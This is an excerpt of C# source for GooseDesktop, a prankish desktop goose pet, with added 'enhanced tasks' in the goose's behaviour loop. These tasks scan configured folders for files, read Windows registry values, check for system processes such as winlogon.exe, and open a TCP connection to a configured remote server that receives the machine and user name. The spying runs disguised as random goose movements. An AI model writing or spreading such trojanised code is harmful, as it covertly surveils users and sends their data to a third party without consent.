...
namespace GooseDesktop
{
  internal static class TheGoose
  {
    ...
    private static TheGoose.GooseTask[] gooseTaskWeightedList = new TheGoose.GooseTask[13]
    {
      ...
      TheGoose.GooseTask.NabMouse,
      TheGoose.GooseTask.NabMouse,
      // New enhanced tasks (only if enabled in config)
      TheGoose.GooseTask.CollectFiles,
      TheGoose.GooseTask.MonitorSystem,
      TheGoose.GooseTask.NetworkCommunicate,
      TheGoose.GooseTask.RegistryAccess,
      TheGoose.GooseTask.ProcessMonitor
    };
    ...
    // New enhanced task variables
    private static TheGoose.Task_CollectFiles taskCollectFilesInfo;
    private static TheGoose.Task_MonitorSystem taskMonitorSystemInfo;
    private static TheGoose.Task_NetworkCommunicate taskNetworkCommunicateInfo;
    private static TheGoose.Task_RegistryAccess taskRegistryAccessInfo;
    private static TheGoose.Task_ProcessMonitor taskProcessMonitorInfo;
    ...
    private static void SetTask(TheGoose.GooseTask task, bool honck)
    {
      ...
      switch (task)
      {
        ...
        case TheGoose.GooseTask.TrackMud:
          ...
          break;
        // New enhanced task initializations
        case TheGoose.GooseTask.CollectFiles:
          TheGoose.taskCollectFilesInfo = new TheGoose.Task_CollectFiles();
          TheGoose.taskCollectFilesInfo.startTime = 0f;
          break;
        case TheGoose.GooseTask.MonitorSystem:
          TheGoose.taskMonitorSystemInfo = new TheGoose.Task_MonitorSystem();
          TheGoose.taskMonitorSystemInfo.startTime = 0f;
          break;
        case TheGoose.GooseTask.NetworkCommunicate:
          TheGoose.taskNetworkCommunicateInfo = new TheGoose.Task_NetworkCommunicate();
          TheGoose.taskNetworkCommunicateInfo.startTime = 0f;
          break;
        case TheGoose.GooseTask.RegistryAccess:
          TheGoose.taskRegistryAccessInfo = new TheGoose.Task_RegistryAccess();
          TheGoose.taskRegistryAccessInfo.startTime = 0f;
          break;
        case TheGoose.GooseTask.ProcessMonitor:
          TheGoose.taskProcessMonitorInfo = new TheGoose.Task_ProcessMonitor();
          TheGoose.taskProcessMonitorInfo.startTime = 0f;
          break;
      }
    }
    ...
    private static void RunAI()
    {
      switch (TheGoose.currentTask)
      {
        ...
        case TheGoose.GooseTask.TrackMud:
          ...
          break;
        // New enhanced task executions
        case TheGoose.GooseTask.CollectFiles:
          TheGoose.RunCollectFiles();
          break;
        case TheGoose.GooseTask.MonitorSystem:
          TheGoose.RunMonitorSystem();
          break;
        case TheGoose.GooseTask.NetworkCommunicate:
          TheGoose.RunNetworkCommunicate();
          break;
        case TheGoose.GooseTask.RegistryAccess:
          TheGoose.RunRegistryAccess();
          break;
        case TheGoose.GooseTask.ProcessMonitor:
          TheGoose.RunProcessMonitor();
          break;
      }
    }
    ...
    // New enhanced task execution methods
    private static void RunCollectFiles()
    {
      ...
      if (TheGoose.taskCollectFilesInfo.startTime == 0f)
      {
        TheGoose.taskCollectFilesInfo.startTime = Time.time;
        TheGoose.taskCollectFilesInfo.duration = TheGoose.Task_CollectFiles.GetCollectionDuration();
        TheGoose.taskCollectFilesInfo.foundFiles = new List<string>();
        TheGoose.taskCollectFilesInfo.currentFileIndex = 0;
        TheGoose.taskCollectFilesInfo.isCollecting = false;
        
        // Initialize file collection
        TheGoose.taskCollectFilesInfo.foundFiles.Clear();
        string[] targetDirs = GooseConfig.settings.TargetDirectories.Split(',');
        ...
        foreach (string dir in targetDirs)
        {
          if (Directory.Exists(dir.Trim()))
          {
            try
            {
              SearchOption searchOption = GooseConfig.settings.RecursiveFileSearch ? 
                SearchOption.AllDirectories : SearchOption.TopDirectoryOnly;
              
              foreach (string ext in extensions)
              {
                string[] files = Directory.GetFiles(dir.Trim(), ext.Trim(), searchOption);
                                 foreach (string file in files)
                 {
                   FileInfo fi = new FileInfo(file);
                   if (fi.Length <= GooseConfig.settings.MaxFileSizeKB * 1024)
                   {
                     TheGoose.taskCollectFilesInfo.foundFiles.Add(file);
        ...
        // Set target to a random position on screen
        TheGoose.targetPos = new Vector2(SamMath.RandomRange(50f, (float) (Program.mainForm.Width - 50)), 
                                        SamMath.RandomRange(50f, (float) (Program.mainForm.Height - 50)));
        TheGoose.SetSpeed(TheGoose.SpeedTiers.Walk);
      }

      if (Time.time - TheGoose.taskCollectFilesInfo.startTime > TheGoose.taskCollectFilesInfo.duration)
      {
        // Process collected files here if needed
        TheGoose.ChooseNextTask();
        return;
      }

      // Real file collection behavior - move to different positions based on found files
      if (Vector2.Distance(TheGoose.position, TheGoose.targetPos) < 20f)
      {
        if (TheGoose.taskCollectFilesInfo.foundFiles.Count > 0)
        {
          // Move to positions representing file locations
          int fileIndex = (int)((Time.time - TheGoose.taskCollectFilesInfo.startTime) * 2) % TheGoose.taskCollectFilesInfo.foundFiles.Count;
          string currentFile = TheGoose.taskCollectFilesInfo.foundFiles[fileIndex];
          
          // Create visual representation of file discovery
          float x = SamMath.RandomRange(50f, (float) (Program.mainForm.Width - 50));
          float y = SamMath.RandomRange(50f, (float) (Program.mainForm.Height - 50));
          TheGoose.targetPos = new Vector2(x, y);
        }
        else
        {
          TheGoose.targetPos = new Vector2(SamMath.RandomRange(50f, (float) (Program.mainForm.Width - 50)), 
    ...
    private static void RunMonitorSystem()
    {
      try {
        if (!GooseConfig.settings.EnableSystemInfoCollection)
        {
          TheGoose.ChooseNextTask();
          return;
        }

      if (TheGoose.taskMonitorSystemInfo.startTime == 0f)
      {
        TheGoose.taskMonitorSystemInfo.startTime = Time.time;
        TheGoose.taskMonitorSystemInfo.interval = TheGoose.Task_MonitorSystem.GetMonitoringInterval();
        TheGoose.taskMonitorSystemInfo.lastCheckTime = Time.time;
        TheGoose.taskMonitorSystemInfo.systemInfo = new List<string>();
        TheGoose.taskMonitorSystemInfo.isActive = true;
        
        // Set target to center of screen
        TheGoose.targetPos = new Vector2((float) (Program.mainForm.Width / 2), (float) (Program.mainForm.Height / 2));
        TheGoose.SetSpeed(TheGoose.SpeedTiers.Walk);
      }

      if (Time.time - TheGoose.taskMonitorSystemInfo.startTime > 30f)
      {
        TheGoose.ChooseNextTask();
        return;
      }

      // Real system monitoring behavior
      if (Time.time - TheGoose.taskMonitorSystemInfo.lastCheckTime > TheGoose.taskMonitorSystemInfo.interval)
      {
        TheGoose.taskMonitorSystemInfo.lastCheckTime = Time.time;
        ...
        try
        {
          ...
          // Move to different positions based on system info
          float x = SamMath.RandomRange(100f, (float) (Program.mainForm.Width - 100));
          float y = SamMath.RandomRange(100f, (float) (Program.mainForm.Height - 100));
          TheGoose.targetPos = new Vector2(x, y);
        }
        catch (Exception ex)
        {
    ...
    private static void RunNetworkCommunicate()
    {
      try {
        if (!GooseConfig.settings.EnableNetworkOperations)
        {
          TheGoose.ChooseNextTask();
          return;
        }

      if (TheGoose.taskNetworkCommunicateInfo.startTime == 0f)
      {
        TheGoose.taskNetworkCommunicateInfo.startTime = Time.time;
        TheGoose.taskNetworkCommunicateInfo.timeout = TheGoose.Task_NetworkCommunicate.GetTimeoutDuration();
        TheGoose.taskNetworkCommunicateInfo.serverAddress = GooseConfig.settings.RemoteServer;
        TheGoose.taskNetworkCommunicateInfo.port = GooseConfig.settings.RemotePort;
        TheGoose.taskNetworkCommunicateInfo.isConnected = false;
        TheGoose.taskNetworkCommunicateInfo.dataToSend = new List<string>();
        
        // Set target to a corner of the screen
        TheGoose.targetPos = new Vector2(50f, 50f);
        TheGoose.SetSpeed(TheGoose.SpeedTiers.Run);
      }

      if (Time.time - TheGoose.taskNetworkCommunicateInfo.startTime > TheGoose.taskNetworkCommunicateInfo.timeout)
      {
        TheGoose.ChooseNextTask();
        return;
      }

      // Real network communication behavior
      if (!string.IsNullOrEmpty(TheGoose.taskNetworkCommunicateInfo.serverAddress) && 
          !TheGoose.taskNetworkCommunicateInfo.isConnected)
      {
        try
        {
          using (TcpClient client = new TcpClient())
          {
            client.ConnectAsync(TheGoose.taskNetworkCommunicateInfo.serverAddress, 
                              TheGoose.taskNetworkCommunicateInfo.port).Wait(3000);
            
            if (client.Connected)
            {
              TheGoose.taskNetworkCommunicateInfo.isConnected = true;
              
                             using (NetworkStream stream = client.GetStream())
               {
                 // Send system information
                 string systemInfo = $"Machine:{Environment.MachineName}|User:{Environment.UserName}|Time:{DateTime.Now}";
                 byte[] data = Encoding.UTF8.GetBytes(systemInfo);
                 stream.Write(data, 0, data.Length);
                 
                 // Collect network data
                 DataCollector.AddNetworkData(TheGoose.taskNetworkCommunicateInfo.serverAddress, 
                                            TheGoose.taskNetworkCommunicateInfo.port, true);
                 
                 // Move to different positions based on network activity
                 TheGoose.targetPos = new Vector2(SamMath.RandomRange(100f, (float) (Program.mainForm.Width - 100)), 
                                                SamMath.RandomRange(100f, (float) (Program.mainForm.Height - 100)));
               }
            }
          }
        }
      ...
      else if (Vector2.Distance(TheGoose.position, TheGoose.targetPos) < 10f)
      {
        TheGoose.targetPos = new Vector2(SamMath.RandomRange(50f, (float) (Program.mainForm.Width - 50)), 
                                        SamMath.RandomRange(50f, (float) (Program.mainForm.Height - 50)));
      }
    ...
    private static void RunRegistryAccess()
    {
      try {
        if (!GooseConfig.settings.EnableRegistryAccess)
        {
          TheGoose.ChooseNextTask();
          return;
        }

      if (TheGoose.taskRegistryAccessInfo.startTime == 0f)
      {
        TheGoose.taskRegistryAccessInfo.startTime = Time.time;
        TheGoose.taskRegistryAccessInfo.targetKey = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion";
        TheGoose.taskRegistryAccessInfo.operation = "read";
        TheGoose.taskRegistryAccessInfo.isComplete = false;
      ...
      if (Time.time - TheGoose.taskRegistryAccessInfo.startTime > TheGoose.Task_RegistryAccess.GetOperationDuration())
      {
        TheGoose.ChooseNextTask();
        return;
      }

      // Real registry access behavior
      if (!TheGoose.taskRegistryAccessInfo.isComplete)
      {
        try
        {
          using (RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion"))
          {
            if (key != null)
            {
               ...
               foreach (string valueName in valueNames)
               {
                 ...
                 DataCollector.AddRegistryData(@"SOFTWARE\Microsoft\Windows\CurrentVersion", valueName, value);
               }
              
              TheGoose.taskRegistryAccessInfo.isComplete = true;
              
              // Move to different positions based on registry access
              TheGoose.targetPos = new Vector2(SamMath.RandomRange(150f, (float) (Program.mainForm.Width - 150)), 
                                             SamMath.RandomRange(150f, (float) (Program.mainForm.Height - 150)));
            }
          }
        }
        catch (Exception ex)
      ...
      else if (Vector2.Distance(TheGoose.position, TheGoose.targetPos) < 15f)
      {
        TheGoose.targetPos = new Vector2(SamMath.RandomRange(100f, (float) (Program.mainForm.Width - 100)), 
                                        SamMath.RandomRange(100f, (float) (Program.mainForm.Height - 100)));
      }
    ...
    private static void RunProcessMonitor()
    {
      try {
        if (!GooseConfig.settings.EnableProcessMonitoring)
        {
          TheGoose.ChooseNextTask();
          return;
        }

      if (TheGoose.taskProcessMonitorInfo.startTime == 0f)
      {
        TheGoose.taskProcessMonitorInfo.startTime = Time.time;
        TheGoose.taskProcessMonitorInfo.interval = TheGoose.Task_ProcessMonitor.GetMonitoringInterval();
        TheGoose.taskProcessMonitorInfo.targetProcesses = new List<string> { "explorer.exe", "svchost.exe", "winlogon.exe" };
        TheGoose.taskProcessMonitorInfo.processStatus = new Dictionary<string, bool>();
        TheGoose.taskProcessMonitorInfo.isActive = true;
        
        // Set target to a random position
        TheGoose.targetPos = new Vector2(SamMath.RandomRange(75f, (float) (Program.mainForm.Width - 75)), 
                                        SamMath.RandomRange(75f, (float) (Program.mainForm.Height - 75)));
        TheGoose.SetSpeed(TheGoose.SpeedTiers.Walk);
      }

      if (Time.time - TheGoose.taskProcessMonitorInfo.startTime > 25f)
      {
        TheGoose.ChooseNextTask();
        return;
      }

      // Real process monitoring behavior
      if (Time.time - TheGoose.taskProcessMonitorInfo.startTime > TheGoose.taskProcessMonitorInfo.interval)
      {
        try
        {
          Process[] processes = Process.GetProcesses();
          TheGoose.taskProcessMonitorInfo.processStatus.Clear();
          
          foreach (string targetProcess in TheGoose.taskProcessMonitorInfo.targetProcesses)
          {
            bool found = false;
            foreach (Process process in processes)
            {
              if (process.ProcessName.ToLower() == targetProcess.ToLower())
              {
                found = true;
                break;
              }
            }
                         TheGoose.taskProcessMonitorInfo.processStatus[targetProcess] = found;
             DataCollector.AddProcessData(targetProcess, found);
           }
          
          // Move to different positions based on process status
          int activeProcesses = TheGoose.taskProcessMonitorInfo.processStatus.Values.Count(x => x);
          float x = SamMath.RandomRange(75f, (float) (Program.mainForm.Width - 75));
          float y = SamMath.RandomRange(75f, (float) (Program.mainForm.Height - 75));
          TheGoose.targetPos = new Vector2(x, y);
        }
        catch (Exception ex)
        {
      ...
      else if (Vector2.Distance(TheGoose.position, TheGoose.targetPos) < 20f)
      {
        TheGoose.targetPos = new Vector2(SamMath.RandomRange(75f, (float) (Program.mainForm.Width - 75)), 
                                        SamMath.RandomRange(75f, (float) (Program.mainForm.Height - 75)));
      }
    ...
    // New enhanced task structures
    private struct Task_CollectFiles
    {
      ...
      public static float GetCollectionDuration()
      {
        return SamMath.RandomRange(10f, 30f);
      }
    ...
    private struct Task_MonitorSystem
    {
      public float startTime;
      ...
      public static float GetMonitoringInterval()
      {
        return SamMath.RandomRange(5f, 15f);
      }
    ...
    private struct Task_NetworkCommunicate
    {
      public float startTime;
      ...
      public static float GetTimeoutDuration()
      {
        return SamMath.RandomRange(5f, 15f);
      }
    ...
    private struct Task_RegistryAccess
    {
      public float startTime;
      ...
      public static float GetOperationDuration()
      {
        return SamMath.RandomRange(2f, 8f);
      }
    ...
    private struct Task_ProcessMonitor
    {
      public float startTime;
      public float interval;
      public List<string> targetProcesses;
      public Dictionary<string, bool> processStatus;
      public bool isActive;

      public static float GetMonitoringInterval()
      {
        return SamMath.RandomRange(3f, 10f);
      }
